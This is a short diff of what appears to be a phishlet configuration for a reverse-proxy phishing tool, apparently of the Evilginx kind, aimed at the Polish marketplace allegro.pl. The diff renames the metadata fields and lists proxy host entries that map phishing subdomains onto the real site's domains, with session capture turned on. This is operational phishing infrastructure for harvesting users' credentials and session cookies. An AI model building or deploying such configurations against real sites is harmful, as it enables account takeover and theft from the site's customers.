@@ -1,5 +1,7 @@
-author: '@customsync'
-min_ver: '2.3.0'
+creator: '@hash3liZer'
+name: 'allegro'
+proto: 'https'
+
 proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'allegro.pl', session: true, is_landing: false, auto_filter: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'allegro.pl', session: true, is_landing: true, auto_filter: false}
